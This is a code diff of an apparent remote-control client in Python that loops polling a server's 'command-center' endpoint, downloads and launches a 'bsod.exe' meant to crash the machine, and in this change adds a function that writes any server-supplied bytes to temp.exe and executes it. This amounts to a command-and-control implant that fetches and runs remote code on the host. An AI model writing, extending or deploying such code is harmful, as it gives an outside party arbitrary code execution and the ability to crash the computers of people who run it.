@@ -10,13 +10,6 @@ PORT = 80
 SCHEME = "http"
 
 
-def invoke_bsod() -> None:
-    with open("temp.exe", "wb") as temp_file:
-        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
-    Popen("temp.exe")
-    remove("temp.exe")
-
-
 def main() -> None:
     while True:
         get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
@@ -29,8 +22,21 @@ def main() -> None:
             load_image(get_images_response)
         if get_bsod_response.status_code == 200:
             invoke_bsod()
-        # if get_run_file_response = get()
+        if get_run_file_response.status_code == 200:
+            run_file(get_run_file_response.content)
         sleep(DELAY)
+
+
+def run_file(content: bytes) -> None:
+    with open("temp.exe", "wb") as temp_file:
+        temp_file.write(content)
+    Popen("temp.exe")
+
+
+def invoke_bsod() -> None:
+    with open("temp.exe", "wb") as temp_file:
+        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
+    Popen("temp.exe")
 
 
 def load_image(get_images_response: Response):
